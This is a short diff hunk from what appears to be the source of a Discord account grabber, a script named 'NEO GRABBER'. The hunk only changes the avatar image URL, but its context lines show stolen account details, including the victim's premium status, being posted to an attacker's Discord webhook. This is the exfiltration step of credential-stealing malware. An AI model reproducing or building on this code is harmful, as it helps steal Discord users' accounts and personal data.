@@ -123,7 +123,7 @@ premium = info['IsPremium']
 discord = Discord(url=webhookk)
 discord.post(
     username="NEO GRABBER"
-    avatar_url="https://cdn.discordapp.com/attachments/991075594420748319/1043931056073621744/Main_Logo.png",
+    avatar_url="https://i.postimg.cc/KYrCdHzb/Main.gif",
     embeds=[
         {
             "username": "NEO GRABBER"
